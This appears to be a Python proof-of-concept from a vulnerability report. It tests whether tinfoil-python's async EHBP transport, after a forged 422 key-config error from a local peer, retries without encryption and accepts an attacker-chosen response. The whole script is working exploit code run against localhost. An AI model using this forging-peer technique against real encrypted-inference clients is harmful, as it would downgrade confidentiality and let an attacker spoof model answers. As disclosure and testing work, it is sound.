"""Async variant: tinfoil-python _AsyncEHBPReVerifyingTransport + AsyncEHBPTransport.
Same forging peer as poc_retry_bodyless.py; body is a one-shot async iterator / file.
Run: ../pyenv-shipped/bin/python -I poc_retry_bodyless_async.py
"""
import asyncio, io, json, threading, tempfile
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
import httpx
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.primitives.asymmetric.x25519 import X25519PrivateKey
from ehbp import AsyncEHBPTransport
from tinfoil.client import _AsyncEHBPReVerifyingTransport

LOG = []
KEYCONFIG_422 = json.dumps({"type": "urn:ietf:params:ehbp:error:key-config", "title": "stale key"}).encode()
FORGED_200 = b'{"forged":"ATTACKER-CHOSEN ANSWER"}'

class Peer(BaseHTTPRequestHandler):
    def log_message(self, *a): pass
    def do_POST(self):
        body = b""
        if self.headers.get("Transfer-Encoding", "").lower() == "chunked":
            while True:
                size = int(self.rfile.readline().strip().split(b";")[0] or b"0", 16)
                if size == 0: self.rfile.readline(); break
                body += self.rfile.read(size); self.rfile.readline()
        else:
            body = self.rfile.read(int(self.headers.get("Content-Length") or 0))
        LOG.append({"n": len(LOG)+1, "has_ehbp_header": "Ehbp-Encapsulated-Key" in self.headers, "body_len": len(body)})
        data = KEYCONFIG_422 if LOG[-1]["n"] == 1 else FORGED_200
        self.send_response(422 if LOG[-1]["n"] == 1 else 200)
        self.send_header("Content-Type", "application/problem+json" if LOG[-1]["n"] == 1 else "application/json")
        self.send_header("Content-Length", str(len(data))); self.end_headers(); self.wfile.write(data)

class Stub:
    def __init__(self, pub): self.pub = pub
    async def _build_ehbp_async_transport(self):
        return AsyncEHBPTransport.from_public_key_hex(self.pub, inner=httpx.AsyncHTTPTransport())

async def case(label, make_content, pub, url):
    LOG.clear()
    stub = Stub(pub)
    t = _AsyncEHBPReVerifyingTransport(stub, await stub._build_ehbp_async_transport())
    async with httpx.AsyncClient(transport=t, follow_redirects=False) as c:
        try:
            r = await c.post(url + "/v1/chat/completions", headers={"Authorization": "Bearer k"}, content=make_content())
            out = f"status={r.status_code} body={r.text!r}"
        except Exception as e:
            out = f"raised {type(e).__name__}: {e}"
    print(f"=== {label} ===")
    for e in LOG: print("  peer saw", e)
    print("  outcome:", out)
    last = LOG[-1] if LOG else None
    if last and last["n"] == 2 and not last["has_ehbp_header"] and last["body_len"] == 0 and "ATTACKER" in out:
        print("  VULNERABLE (async): downgraded to bodyless plaintext; forged response accepted")
    elif last and last["n"] == 2 and last["has_ehbp_header"]:
        print("  OK (async): retry re-encrypted")

async def main():
    k = X25519PrivateKey.generate()
    pub = k.public_key().public_bytes(serialization.Encoding.Raw, serialization.PublicFormat.Raw).hex()
    srv = ThreadingHTTPServer(("127.0.0.1", 0), Peer)
    threading.Thread(target=srv.serve_forever, daemon=True).start()
    url = f"http://127.0.0.1:{srv.server_address[1]}"
    payload = b'{"model":"m","messages":[{"role":"user","content":"CONFIDENTIAL"}]}'
    await case("control: bytes", lambda: payload, pub, url)
    async def agen():
        yield payload[:10]; yield payload[10:]
    g = agen()
    await case("async generator (one-shot)", lambda: g, pub, url)
    class OneShotAsyncIterable:  # async iterable object (not an async generator): httpx re-iterates it
        def __init__(self, parts): self.parts = list(parts)
        def __aiter__(self): return self
        async def __anext__(self):
            if not self.parts: raise StopAsyncIteration
            return self.parts.pop(0)
    one = OneShotAsyncIterable([payload[:10], payload[10:]])
    await case("async iterable object (one-shot, non-generator)", lambda: one, pub, url)

asyncio.run(main())
